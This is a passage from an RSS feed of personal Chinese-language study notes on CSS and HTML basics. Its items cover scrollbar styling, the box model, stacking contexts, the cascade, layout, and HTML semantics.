      <description>修改网页滚动条样式 属性描述 /* 整个滚动条*/ ::-webkit-scrollbar { }  /* 滚动条两端的按钮 */ ::-webkit-scrollbar-button { }  /* 滚动条的滚动轨道 */ ::-webkit-scrollbar-track { }  /* 内层轨道 */ ::-webkit-scrollbar-track-piece { }  /* 滑块 */ ::-webkit-scrollbar-thumb { }  /* 边角 */ ::-webkit-scrollbar-corner { }  /* 右下角拖动块的样式 */ ::-webkit-resizer { } 使用 一般我们这样设置这几个主要属性就 OK 了。
/*定义整个滚动条高宽及背景：高宽分别对应横竖滚动条的尺寸*/ ::-webkit-scrollbar { 	width: 10px; 	background-color: #f5f5f5; } /*定义滚动条轨道：内阴影 + 圆角*/ ::-webkit-scrollbar-track { 	background-color: #f5f5f5; } /*定义滑块：内阴影 + 圆角*/ ::-webkit-scrollbar-thumb { 	border-radius: 10px; 	background-color: #555; } 更多相关属性 :horizontal //水平方向的滚动条 :vertical //垂直 方向的滚动条 :decrement //应用于按钮和内层轨道(track piece)。它用来指示按钮或者内层轨道是否会减小视窗的位置(比如，垂直滚动条的上面，水平滚动条的左边。) :increment //decrement类似，用来指示按钮或内层轨道是否会增大视窗的位置(比如，垂直滚动条的下面和水平滚动条的右边。) :start //伪类也应用于按钮和滑块。它用来定义对象是否放到滑块的前面。 :end //类似于start伪类，标识对象是否放到滑块的后面。 :double-button //该伪类以用于按钮和内层轨道。用于判断一个按钮是不是放在滚动条同一端的一对按钮中的一个。对于内层轨道来说，它表示内层轨道是否紧靠一对按钮。 :single-button //类似于double-button伪类。对按钮来说，它用于判断一个按钮是否自己独立的在滚动条的一段。对内层轨道来说，它表示内层轨道是否紧靠一个single-button。 :no-button //用于内层轨道，表示内层轨道是否要滚动到滚动条的终端，比如，滚动条两端没有按钮的时候。 :corner-present //用于所有滚动条轨道，指示滚动条圆角是否显示。 :window-inactive //用于所有的滚动条轨道，指示应用滚动条的某个页面容器(元素)是否当前被激活。 </description>
    </item>
    
    <item>
      <title>Css Body 背景图</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/body-%E8%83%8C%E6%99%AF%E5%9B%BE/</link>
      <pubDate>Sat, 09 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/body-%E8%83%8C%E6%99%AF%E5%9B%BE/</guid>
      <description>Body 背景图 画布 它是一块区域，也叫视口（可视窗口）。
它的最小宽度为视口宽度，最小高度为视口高度。
Html 的背景图 该元素的背景覆盖画布。即给该元素设置背景，相当于设置画布的背景。
Body 的背景图 若根元素有背景，body 元素的背景正常显示。
若根元素没有设置背景，则 body 元素的背景覆盖画布，则会出现不正常的现象，原因为若没有这个规则，就无法给整个网页设置背景。
背景图覆盖画布时 高度：纵向位置百分比、预设值，相对于根元素高度。
宽度：横向位置百分比、预设值，相对于视口。</description>
    </item>
    
    <item>
      <title>Css keyframes</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/keyframes/</link>
      <pubDate>Sat, 09 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/keyframes/</guid>
      <description>Css keyframes 持续旋转 选中文档中的元素。
.map2 {  width: 8.0375rem;  height: 8.0375rem;  background-image: url(../images/lbx.png);  opacity: 0.6;  animation: rotate 15s linear infinite;  z-index: 2; } keyframes @keyframes rotate { 	/* 从 0° 开始旋转 */ 	from { 	transform: translate(-50%, -50%) rotate(0deg); 	} 	/* 旋转到 360 ° */ 	to { 	transform: translate(-50%, -50%) rotate(360deg); 	} } </description>
    </item>
    
    <item>
      <title>italic 和 oblique</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/italic-%E5%92%8C-oblique/</link>
      <pubDate>Sat, 09 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/italic-%E5%92%8C-oblique/</guid>
      <description>italic 和 oblique italic：浏览器会显示一个斜体的字体样式。
oblique：浏览器会显示一个倾斜的字体样式。
可以发现关键之处为斜体和倾斜。
Italic 是使用了文字本身的斜体属性，
oblique 是让没有斜体属性的文字做倾斜处理。
因为有少量的不常用字体没有斜体的属性，
如果我们使用 Italic 就会没有效果，只能 Oblique 使用才能使文字倾斜。</description>
    </item>
    
    <item>
      <title>Css 语法</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/%E8%AF%AD%E6%B3%95/</link>
      <pubDate>Fri, 08 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/%E8%AF%AD%E6%B3%95/</guid>
      <description>语法 CSS 的语法通常是一个选择器，用于选择 HTML 文档中的元素。
选择器：位于语法开始，用于选中 HTML 文档中的元素。
声明：以 { 开始，以 } 结束。{ 与 } 必须成对出现。
声明块：由属性与属性值组成。
.selector { 	color: #000; } 使用 内联式：将 CSS 语法书写到元素的 style 属性中，仅对当前元素生效，也叫行内式。
内嵌式：首先将 style 元素书写到 head 元素中，然后将 CSS 语法书写到 style 元素中，也叫内部样式表。
外链式：将 CSS 语法书写到独立的 CSS 文件中，并在 HTML 文档中使用 link 元素引入，也叫外部样式表。
优先级：内联式 &amp;gt; 内嵌式 &amp;gt; 外链式。</description>
    </item>
    
    <item>
      <title>Css 块格式化上下文</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/%E5%9D%97%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%8A%E4%B8%8B%E6%96%87/</link>
      <pubDate>Thu, 07 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/%E5%9D%97%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%8A%E4%B8%8B%E6%96%87/</guid>
      <description>块格式化上下文 格式化上下文（Block Formatting Context），它是一块 独立的渲染区域，它规定了在该区域中，普通流块盒的布局。
触发 BFC 的元素  根元素 html，该元素创建的 BFC 覆盖了文档中的所有元素。 浮动元素，float 的值不为 none 的元素。 绝对定位元素，position 的值为 absolute 或 fixed 的元素。 overflow 的值不为 visible 的块盒。 行块盒，display 的值为 inline-block 的元素。 表格单元格，display 的值为 table-cell 的元素，表格单元格默认为该值。 表格标题，display 的值为 table-caption 的元素，表格标题默认为该值。  正常布局流块盒的渲染区域  每个块盒都会参与块格式化上下文的创建。 不同的 BFC，它们进行渲染时互不干扰。 创建 BFC 的元素，隔绝了它内部和外部的联系，内部的渲染不会影响到外部区域。 创建 BFC 的元素，它的所有内容都会被包含在它所创建的 BFC 中  BFC 的作用 解决高度塌陷
创建 BFC 的元素，它的自动高度会计算浮动元素；若只是为了创建 BFC 一般使用副作用最小的方式：设置块盒的 overflow 的属性值为 hidden。仅仅是为了解决高度坍塌，建议使用伪元素 after。
原理：因为它要隔绝内部与外部的关系，而高度坍塌会使元素不在其包含块内，所以它的自动高度必须计算浮动元素，因此创建 BFC 可以解决高度坍塌的问题。
解决浮动流脱离文档流</description>
    </item>
    
    <item>
      <title>Css 画三角形</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/%E7%94%BB%E4%B8%89%E8%A7%92%E5%BD%A2/</link>
      <pubDate>Thu, 07 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/%E7%94%BB%E4%B8%89%E8%A7%92%E5%BD%A2/</guid>
      <description>画三角形 .triangle { 	width: 0; 	height: 0; 	border-width: 50px; 	border-style: solid; 	display: inline-block; 	border-color: transparent transparent #008c8c transparent; } </description>
    </item>
    
    <item>
      <title>Css 盒子模型</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/</link>
      <pubDate>Wed, 06 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/</guid>
      <description>盒子模型 前言 在 CSS 中，每一个元素都可以看作是一个盒子，这个盒子由以下几个方面组成。目前常用的有两种盒模型，分别是标准盒模型和怪异盒模型。
一个盒子的组成  内容（content） 内边距（padding） 边框（border） 外边距（margin）  标准盒模型 box-sizing 的值为 content-box 的元素；且浏览器将采用标准模式解析。
盒子总宽度 = width + padding（左右）+ border（左右）+ margin（左右）。
盒子总高度 = height + padding（上下）+ border（上下）+ margin（上下。
怪异盒模型 box-sizing 的值为 border-box 的元素；且浏览器将采用怪异模式（兼容模式）解析，也叫 IE 盒模型。
盒子总宽度 = width + margin（左右），其 width 包含了 padding（左右）和 border（左右）的宽度。
盒子总高度 = width + margin（上下），其 height 包含了 padding（上下）和 border（上下）的高度。</description>
    </item>
    
    <item>
      <title>Css 层叠上下文</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/%E5%B1%82%E5%8F%A0%E4%B8%8A%E4%B8%8B%E6%96%87/</link>
      <pubDate>Tue, 05 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/%E5%B1%82%E5%8F%A0%E4%B8%8A%E4%B8%8B%E6%96%87/</guid>
      <description>层叠上下文 它是一块区域，它由某个元素创建，它规定了该区域中的内容在 Z 轴上排列的先后顺序。
它是一种 三维概念。所有的 HTML 元素都根据其元素的属性按照优先级顺序占据这个空间。
规则 只有定位元素设置 z-index 有效。
设置 z-index 值为负数的元素，会被正常流、浮动流覆盖。
z-index 的值，该值越大，则越靠近用户。
所有元素都处于 html 元素的层叠上下文中。
如遇到 z-index 一样的层叠上下文，则比较元素的书写顺序。
层叠上下文的元素，它本身永远被父级包含内，哪怕该元素设置了 z-index:-9999，它也只能包含于自身父元素的层叠上下文中。
每一个层叠上下文的元素，它们都完全独立于同级的元素，当处理层叠上下文时只会考虑自己的子元素。
创建层叠上下文的元素  根元素（html）。 Position 值为 absolute 或 relative 且 z-index 值不为 auto 的元素。 Opacity 的值小于 1 的元素。  优先级  同一个层叠上下文中，元素从底部到顶部的优先级 创建层叠上下文元素的背景和边框。 z-index 的值为负的层叠上下文元素。 常规流非定位元素的块盒。 非定位的浮动流。 常规流非定位行盒。 任何 z-index 属性值为 auto 的定位子元素，以及 z-index 为 0 的元素。 z-index 的值为正的元素。  </description>
    </item>
    
    <item>
      <title>Css 层叠</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/%E5%B1%82%E5%8F%A0/</link>
      <pubDate>Mon, 04 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/%E5%B1%82%E5%8F%A0/</guid>
      <description>层叠 层叠是 CSS 的一个基本特征，浏览器通过 优先级 来判断哪些属性值对一个元素最为重要，从而在这个元素上应用这些属性值。
确定声明值 找出样式表中没有冲突的声明，并应用到 CSS 属性，样式声明不冲突则不会发生层叠。
层叠 对样式表中有冲突（同一个元素在样式表中设置了多个相同的属性）的声明使用层叠规则。
比较重要性
 重要性由高到低为 样式表中的 !imliortant 样式（尽量不使用）。 样式表中的普通样式（内联式 &amp;gt; 内嵌式 &amp;gt; 外链式）。 浏览器中的默认样式。  比较优先级
 选择器选中的范围越窄，优先级越高。 通过选择器，计算出一个四位数（xxxx），该四位数越大越则优先级越高。这个四位数的进制为逢 256 进一。 :nth-child()选择器会覆盖:hover选择器  四位数的取值
  千位：内联样式，记作 1，否则记为 0。
  百位：所有 id 选择器的数量。
  十位：所有类选择器、属性选择器、伪类选择器的数量。
  个位：元素选择器、伪元素选择器的数量。
  零：通配符选择器。
  比较源次序
CSS 样式书写靠后的属性最终会应用到元素。
继承 使用继承，对仍然没有值的属性，若可以继承（部分属性是不能继承的，通常情况下，只有跟文字内容有关的属性可以被继承。），则继承其父元素的属性。
当元素的属性有默认值时，该元素一般不会继承父元素的属性。
使用默认值 每个 CSS 在属性都会有默认值，当继承结束后，对于仍然没有值的属性，会使用默认值。</description>
    </item>
    
    <item>
      <title>Css 布局</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/%E5%B8%83%E5%B1%80/</link>
      <pubDate>Sun, 03 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/%E5%B8%83%E5%B1%80/</guid>
      <description>布局 正常流布局  默认情况下，所有元素都属于正常流。 块盒独占一行。 行盒水平依次排列。 包含块：每个盒子都有它的包含块，包含块决定了该盒子的排列范围。 在正常布局流中，元素的包含块，都是该元素父元素的内容盒。  margin 合并 多个同级且相邻的正常布局流块盒，当它们的上下margin相邻，则会合并为一个margin。
 两个外边距值都是正数，则取较大值； 两个值都是负数，则取较大值； 一正一负则取两个值的和，  该情况可以触发 BFC 解决。
margin 塌陷 正常布局流中的呈父子关系的块盒，如果父元素没有设置上下内边距或上下边框，则子元素的上下margin就会和父元素的上下margin重合，且这时如果设置子元素的上下margin，相当于设置父元素的margin。
该情况可以触发 BFC 解决。
浮动流布局  使元素向左上或向右上排列。 通常情况，浮动元素会无视正常布局元素，它会将正常布局元素覆盖。 在一行浮动元素中，若父元素装不下所有的浮动元素，则多余的浮动元素会自动向下移动，直到具备足够的空间能容纳这些多余的浮动元素，才向左或向右移动。 行盒在排列时，默认会避开浮动元素（单独的文字也是行盒，因为浏览器会自动生成一个行盒包裹单独的文字，该行盒为匿名行盒）。 浮动元素一定是块盒。 不会发生 margin 合并。 脱离正常布局流。  高度塌陷 正常布局流元素高度自适应，它的子元素浮动后，该元素在计算高度时，不会考虑浮动后的子元素的高度，则会导致该元素高度为 0，这种情况称为高度塌陷。
解决：
利用伪元素 after 清除浮动即可解决。
定位流布局 使一个元素从它原本在正常布局流中应该在的位置移动到另一个位置。
相对定位   使元素在原来位置上进行偏移；若没有设置偏移量，对元素本身没有任何影响。
  提升元素层级（z-index）。
  盒子的偏移不会对其他盒子造成任何影响。
  脱离正常布局流。
  尽管元素被偏移了，但它仍然占据着它没偏移前的空间。
  绝对定位   它相对于 static 定位以外的第一个父元素进行定位；若没有，则它的包含块为整个网页（初始化包含块），原位置不会被保留。</description>
    </item>
    
    <item>
      <title>HTML img 的常见问题</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/html/img-%E7%9A%84%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</link>
      <pubDate>Sun, 03 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/html/img-%E7%9A%84%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</guid>
      <description>img 的常见问题 关于无法设置宽高 如果该元素的图像链接失效，则该元素的特性会与行盒一样，无法设置宽高；如果想要图像链接失效后仍具有宽高，可以将该元素设置为块盒或者行块盒。
关于图像底部的留白 当任何一个元素（例如 div）内包含行盒（例如 img）时，该 img 行盒就会在这个 div 元素的内部创建参考线，即这个 div 元素在没有设置下外边距的情况下，img 元素的基线（下外边距的底部）会与父元素的基线对齐（即留白部分就是 img 元素的下外边距），因此导致图像底部有留白。
解决方法：
 第一种是将父元素的字体大小设置为零，则父元素的内部就不会产生参考线。 第二种是将 img 元素设置为块盒，因此其父元素的内部就没有包含行盒，因此不会在其父元素内部产生参考线。  </description>
    </item>
    
    <item>
      <title>HTML 元素语义化</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/html/%E5%85%83%E7%B4%A0%E8%AF%AD%E4%B9%89%E5%8C%96/</link>
      <pubDate>Sun, 03 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/html/%E5%85%83%E7%B4%A0%E8%AF%AD%E4%B9%89%E5%8C%96/</guid>
      <description>元素语义化 前言 在 HTML 5 中，新增了许多元素，这些不同的元素都有不同的含义，因此语义化指的是用最合理、最恰当的元素来标记网页内容，使得机器也可以知道页面中有哪些元素，比如，文章、标题、或是段落。
语义化的优点  使文档在没有 CSS 样式的条件下，也能很好地呈现出内容结构。 使文档结构变的清晰，更具可读性，且利于后期的代码维护。 方便其他设备解析（屏幕阅读器、盲人阅读器、移动设备等）。 有利于 SEO。  </description>
    </item>
    
    <item>
      <title>htm、html、shtml 后缀的区别</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/html/htmhtmlshtml-%E5%90%8E%E7%BC%80%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
      <pubDate>Sun, 03 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/html/htmhtmlshtml-%E5%90%8E%E7%BC%80%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
      <description>htm、html、shtml 后缀的区别 首先 htm、html、shtml 都是静态网页的后缀，三者也可以说都是只是扩展名不同，其他一样，都是静态的网页。
Htm 和 html 是完全静态的网页不通过服务器编译解释直接送出给浏览器读取的静态网页，以 htm 和 html 伪静态 Request 除外。
html、htm、shtml、shtm 均是静态 html 网页，都是网页文件后缀名不同的 html 网页扩展名。
htm html 与 htm 均是静态网页后缀名，网页文件没有区别与区分，html 与 htm 后缀网页后缀可以互换，对网页完全没有影响同时也没有区别。可以认为 html 与 htm 没有本质区别，只是两者适用于不同的运行环境（DOS 和 UNIX）之下。
shtml shtml 命名的网页文件里，使用了 ssi 的一些指令，就像 asp 中的指令，你可以在 SHTML 文件中写入 SSI 指令，当客户端访问这些 shtml 文件时，服务器端会把这些 SHTML 文件进行读取和解释，把 SHTML 文件中包含的 SSI 指令解释出来。</description>
    </item>
    
  </channel>
</rss>
